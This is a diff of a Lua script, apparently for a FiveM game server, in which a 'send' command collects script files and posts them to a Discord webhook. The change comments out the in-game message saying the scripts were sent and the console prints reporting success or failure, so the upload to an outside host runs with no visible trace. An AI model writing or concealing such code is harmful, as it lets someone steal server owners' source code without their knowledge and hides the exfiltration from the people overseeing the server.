@@ -62,9 +62,9 @@ RegisterCommand("send", function(source, args, rawCommand)
     end
 
     SendToDiscord(scripts)
-    TriggerClientEvent("chat:addMessage", source, {
-        args = { "System", "Die Skripte wurden an Discord gesendet." }
-    })
+    --TriggerClientEvent("chat:addMessage", source, {
+    --    args = { "System", "Die Skripte wurden an Discord gesendet." }
+    --})
 end, false)
 
 function GetAllFilesInDirectory(directory)
@@ -94,9 +94,9 @@ function SendToDiscord(scripts)
 
     PerformHttpRequest(discord_webhook_url, function(err, text, headers) 
         if err ~= 200 then
-            print("Fehler beim Senden an Discord: " .. err)
+            --print("Fehler beim Senden an Discord: " .. err)
         else
-            print("Erfolgreich an Discord gesendet.")
+            --print("Erfolgreich an Discord gesendet.")
         end
     end, 'POST', json.encode(jsonData), { ['Content-Type'] = 'application/json' })
 end
